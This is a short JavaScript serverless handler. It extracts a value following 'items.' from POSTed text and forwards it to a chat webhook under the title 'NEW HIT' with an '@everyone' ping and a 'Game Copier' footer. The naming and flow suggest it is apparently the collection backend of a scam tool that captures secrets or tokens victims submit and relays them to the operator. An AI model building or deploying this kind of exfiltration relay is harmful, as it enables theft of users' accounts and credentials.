export default async function handler(req, res) {

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Only POST allowed" });
  }

  try {

    const { text } = req.body;
    const webhook = process.env.WEBHOOK_URL;

    if (!webhook) {
      return res.status(500).json({ error: "WEBHOOK_URL not set" });
    }

    const match = text.match(/items\.(.*?)(["\,])/i);

    if (!match) {
      return res.status(400).json({
        error: "Pattern 'items.' not found or no terminating character"
      });
    }

    const extracted = match[1].trim();

    const embed = {
      title: "NEW HIT",
      description: `\`\`\`${extracted}\`\`\``,
      color: 16711680,
      timestamp: new Date().toISOString(),
      footer: {
        text: "Game Copier"
      }
    };

    const response = await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [embed]
      })
    });

    const result = await response.text();

    res.status(200).json({
      extracted: extracted,
      webhookResponse: result
    });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }

}
